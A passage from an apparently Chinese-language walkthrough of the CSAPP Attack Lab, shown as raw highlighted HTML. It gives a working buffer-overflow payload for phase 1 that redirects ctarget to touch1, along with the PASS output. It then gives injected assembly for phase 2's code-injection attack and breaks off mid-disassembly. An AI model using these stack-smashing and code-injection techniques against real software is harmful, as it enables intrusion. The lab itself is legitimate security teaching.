style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> &lt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> phase.txt</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> &gt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> phase.raw</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>然后，我们可以将生成的 <code>phase.raw</code> 文件作为输入传递给目标程序：</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">./</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> ctarget</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> &lt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> phase.raw</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">./</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> ctarget</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;"> -i</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> phase.raw</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>或者使用流水线方式：</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">cat</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> phase.txt</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> |</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> ./hex2raw</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> |</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> ./ctarget</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="phase-1" tabindex="-1"><a class="header-anchor" href="#phase-1"><span>Phase 1</span></a></h2><p>在 phase 1 中，我们需要针对 <code>ctarget</code> 程序实现栈粉碎攻击。</p><div class="language-c line-numbers-mode" data-highlighter="shiki" data-ext="c" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-c"><span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">void</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> test</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">()</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">{</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">    int</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> val</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">;</span></span>
<span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    val </span><span style="--shiki-light:#999999;--shiki-dark:#666666;">=</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> getbuf</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">();</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">    printf</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">No exploit. Getbuf returned 0x</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">%x\n</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">,</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> val</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-c line-numbers-mode" data-highlighter="shiki" data-ext="c" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-c"><span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">void</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> touch1</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">()</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">{</span></span>
<span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    vlevel </span><span style="--shiki-light:#999999;--shiki-dark:#666666;">=</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 1</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">;</span><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;"> /* Part of validation protocol */</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">    printf</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">Touch1!: You called touch1()</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">\n</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">    validate</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">1</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">    exit</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">0</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>我们需要构造一个输入，使得 <code>getbuf</code> 函数返回后，程序的控制流跳转到 <code>touch1</code> 函数。为此，我们需要覆盖栈上的返回地址，使其指向 <code>touch1</code> 函数的地址。</p><p>我们先查看一下 <code>getbuf</code> 函数的汇编代码，了解一下函数的栈空间是如何分布的。</p><div class="language-asm line-numbers-mode" data-highlighter="shiki" data-ext="asm" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-asm"><span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">0000000000401ba7 &lt;getbuf&gt;:</span></span>
<span class="line"><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">  401ba7</span><span style="--shiki-light:#999999;--shiki-light-font-style:italic;--shiki-dark:#666666;--shiki-dark-font-style:italic;">:</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">	f3 0f 1e fa          	</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">endbr64</span></span>
<span class="line"><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">  401bab</span><span style="--shiki-light:#999999;--shiki-light-font-style:italic;--shiki-dark:#666666;--shiki-dark-font-style:italic;">:</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">	48</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 83</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> ec </span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">18</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">          	sub</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    $0x18,%</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rsp</span></span>
<span class="line"><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">  401baf</span><span style="--shiki-light:#999999;--shiki-light-font-style:italic;--shiki-dark:#666666;--shiki-dark-font-style:italic;">:</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">	48</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 89</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> e7             	</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">mov</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rsp</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">,%</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rdi</span></span>
<span class="line"><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">  401bb2</span><span style="--shiki-light:#999999;--shiki-light-font-style:italic;--shiki-dark:#666666;--shiki-dark-font-style:italic;">:</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">	e8 </span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">57</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 03</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 00</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 00</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">       	call</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">   401f0e &lt;Gets&gt;</span></span>
<span class="line"><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">  401bb7</span><span style="--shiki-light:#999999;--shiki-light-font-style:italic;--shiki-dark:#666666;--shiki-dark-font-style:italic;">:</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">	b8 </span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">01</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 00</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 00</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 00</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">       	mov</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    $0x1,%</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">eax</span></span>
<span class="line"><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">  401bbc</span><span style="--shiki-light:#999999;--shiki-light-font-style:italic;--shiki-dark:#666666;--shiki-dark-font-style:italic;">:</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">	48</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 83</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> c4 </span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">18</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">          	add</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    $0x18,%</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rsp</span></span>
<span class="line"><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">  401bc0</span><span style="--shiki-light:#999999;--shiki-light-font-style:italic;--shiki-dark:#666666;--shiki-dark-font-style:italic;">:</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">	c3                   	</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">ret</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>从汇编代码中，我们可以看到 <code>getbuf</code> 函数在栈上分配了 0x18（24）字节的空间用于局部变量 <code>buf</code>。因此，我们需要输入超过 24 字节的数据来覆盖返回地址。从汇编代码中，我们还可以看到 <code>touch1</code> 函数的地址是 <code>0x401c33</code>。</p><p>于是，我们可以构造如下的输入：</p><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-text"><span class="line"><span>/* phase1.txt */</span></span>
<span class="line"><span>00 00 00 00 00 00 00 00</span></span>
<span class="line"><span>00 00 00 00 00 00 00 00</span></span>
<span class="line"><span>00 00 00 00 00 00 00 00</span></span>
<span class="line"><span>33 1c 40 00 00 00 00 00 /* Address of touch1() */</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>转换为原始字节序列并传递给 <code>ctarget</code> 程序：</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">cat</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> phase1.txt</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> |</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> ./hex2raw</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> |</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> ./ctarget</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-text"><span class="line"><span>Cookie: 0x24c8ce66</span></span>
<span class="line"><span>Type string:Touch1!: You called touch1()</span></span>
<span class="line"><span>Valid solution for level 1 with target ctarget</span></span>
<span class="line"><span>PASS: Sent exploit string to server to be validated.</span></span>
<span class="line"><span>NICE JOB!</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="phase-2" tabindex="-1"><a class="header-anchor" href="#phase-2"><span>Phase 2</span></a></h2><p>在 phase 2 中，我们需要针对 <code>ctarget</code> 程序实现代码注入攻击。</p><div class="language-c line-numbers-mode" data-highlighter="shiki" data-ext="c" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-c"><span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">void</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> test</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">()</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">{</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">    int</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> val</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">;</span></span>
<span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    val </span><span style="--shiki-light:#999999;--shiki-dark:#666666;">=</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> getbuf</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">();</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">    printf</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">No exploit. Getbuf returned 0x</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">%x\n</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">,</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> val</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-c line-numbers-mode" data-highlighter="shiki" data-ext="c" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-c"><span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">void</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> touch2</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">unsigned</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;"> val</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">)</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">{</span></span>
<span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    vlevel </span><span style="--shiki-light:#999999;--shiki-dark:#666666;">=</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 2</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">;</span><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;"> /* Part of validation protocol */</span></span>
<span class="line"><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">    if</span><span style="--shiki-light:#999999;--shiki-dark:#666666;"> (</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">val </span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">==</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> cookie</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">)</span><span style="--shiki-light:#999999;--shiki-dark:#666666;"> {</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">        printf</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">Touch2!: You called touch2(0x</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">%.8x</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">)</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">\n</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">,</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> val</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">        validate</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">2</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">    }</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;"> else</span><span style="--shiki-light:#999999;--shiki-dark:#666666;"> {</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">        printf</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">Misfire: You called touch2(0x</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">%.8x</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">)</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">\n</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">,</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> val</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">        fail</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">2</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">    }</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">    exit</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">0</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>我们需要构造一个输入，使得 <code>getbuf</code> 函数返回后，程序的控制流跳转到我们注入的代码，并调用 <code>touch2</code> 函数。为此，我们需要注入一段代码，该代码将 cookie 的值 <code>mov</code> 给 <code>%edi</code> 作为参数，并将 <code>touch2</code> 函数的地址 <code>pushq</code> 压入栈中，最后 <code>ret</code> 返回，这样程序就会跳转到 <code>touch2</code> 函数执行。</p><div class="language-asm line-numbers-mode" data-highlighter="shiki" data-ext="asm" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-asm"><span class="line"><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">; phase 2 injected code</span></span>
<span class="line"><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">0000000000000000</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> &lt;</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">.text</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">&gt;:</span></span>
<span class="line"><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">   0</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">:	bf </span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">66</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> ce c8 </span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">24</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">       	mov</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    $0x24c8ce66,%</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">edi</span></span>
<span class="line"><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">   5</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">:	</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">68</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 67</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> 1c </span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">40</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 00</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">       	push</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">   $0x401c67</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">   a</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">:</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">	c3                   	</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">ret</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>除此之外，我们还需要用注入代码的起始位置地址（即储存字符串的地址）覆盖 <code>getbuf</code> 函数的返回地址。</p><div class="language-asm line-numbers-mode" data-highlighter="shiki" data-ext="asm" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-asm"><span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">0000000000401ba7 &lt;getbuf&gt;:</span></span>
<span class="line"><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">  401ba7</span><span style="--shiki-light:#999999;--shiki-light-font-style:italic;--shiki-dark:#666666;--shiki-dark-font-style:italic;">:</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">	f3 0f 1e fa          	</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">endbr64</span></span>
<span class="line"><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">  401bab</span><span style="--shiki-light:#999999;--shiki-light-font-style:italic;--shiki-dark:#666666;--shiki-dark-font-style:italic;">:</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">	48</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 83</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> ec </span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">18</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">          	sub</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    $0x18,%</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rsp</span></span>
<span class="line"><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">  401baf</span><span style="--shiki-light:#999999;--shiki-light-font-style:italic;--shiki-dark:#666666;--shiki-dark-font-style:italic;">:</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">	48</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 89</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> e7             	</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">mov</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rsp</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">,%</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rdi</span></span>
<span class="line"><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">  401bb2</span><span style="--shiki-light:#999999;--shiki-light-font-style:italic;--shiki-dark:#666666;--shiki-dark-font-style:italic;">:</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">	e8 </span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">57</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 03</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 00</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 00</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">       	call</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">   401f0e &lt;Gets&gt;</span></span>
